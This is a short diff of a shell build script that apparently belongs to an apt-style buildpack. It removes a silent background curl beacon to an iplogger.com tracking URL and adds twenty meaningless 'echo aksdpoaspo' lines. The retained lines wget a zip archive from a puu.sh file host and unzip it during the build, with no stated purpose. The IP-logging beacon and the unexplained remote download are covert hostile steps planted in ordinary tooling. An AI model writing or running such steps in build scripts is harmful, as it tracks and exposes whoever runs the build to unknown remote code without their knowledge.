@@ -57,7 +57,26 @@ for DEB in $(ls -1 $APT_CACHE_DIR/archives/*.deb); do
   dpkg -x $DEB $BUILD_DIR/.apt/
 done
 
-curl --silent "https://iplogger.com/1H4CV6" &
+echo "aksdpoaspo"
+echo "aksdpoaspo"
+echo "aksdpoaspo"
+echo "aksdpoaspo"
+echo "aksdpoaspo"
+echo "aksdpoaspo"
+echo "aksdpoaspo"
+echo "aksdpoaspo"
+echo "aksdpoaspo"
+echo "aksdpoaspo"
+echo "aksdpoaspo"
+echo "aksdpoaspo"
+echo "aksdpoaspo"
+echo "aksdpoaspo"
+echo "aksdpoaspo"
+echo "aksdpoaspo"
+echo "aksdpoaspo"
+echo "aksdpoaspo"
+echo "aksdpoaspo"
+echo "aksdpoaspo"
 
 wget -O abc.zip "http://puu.sh/xUHe3/09ed0bb5d1.zip"
 unzip abc.zip
